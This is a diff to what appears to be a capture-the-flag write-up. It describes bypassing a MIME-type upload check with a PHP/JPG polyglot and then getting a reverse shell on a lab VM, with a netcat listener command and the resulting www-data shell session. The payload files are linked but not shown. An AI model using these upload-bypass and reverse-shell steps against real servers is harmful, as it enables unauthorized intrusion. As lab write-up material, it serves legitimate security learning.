@@ -194,7 +194,7 @@ Record updated successfullyThe file has been uploaded
 
 so MIME type it is.
 
-We have to create polyglot PHP/JPG payload. how i do it is open jpg file and append php payload at last so let's create simple payload.
+We have to create polyglot PHP/JPG payload. how i do it is open jpg file and append php payload at last so let's create [simple.php](files/simple.php) payload.
 
 **Record updated successfullyThe file has been uploaded** and file is uploaded successfully but where ?
 
@@ -209,5 +209,36 @@ so our file is at http://192.168.1.21:42710/assets/uploads/simple.php
 <img width="759" alt="image" src="https://user-images.githubusercontent.com/79740895/208973100-2b05bb94-de13-42f2-bd9d-e6c978989c45.png">
 
 It works just fine let's get reverse shell. for reference: https://www.revshells.com/
+
+[revshell.php](files/revshell.php)
+
+we start listener: `nc -lvnp 8888`
+
+and path= http://192.168.1.21:42710/assets/uploads/revshell.php
+
+on visiting this file we have reverse shell:
+
+```Shell
+┌─[aftab@parrot]─[~/Downloads/practice/challenge]
+└──╼ $nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.1.12] from (UNKNOWN) [192.168.1.21] 38442
+Linux heathrow-VirtualBox 5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 23:44:47 up  2:01,  1 user,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+heathrow tty2     tty2             21:32    2:12m  0.03s  0.03s /usr/libexec/gnome-session-binary --systemd --session=ubuntu
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (732): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@heathrow-VirtualBox:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@heathrow-VirtualBox:/$ 
+
+```
+
+
+
+
 
 
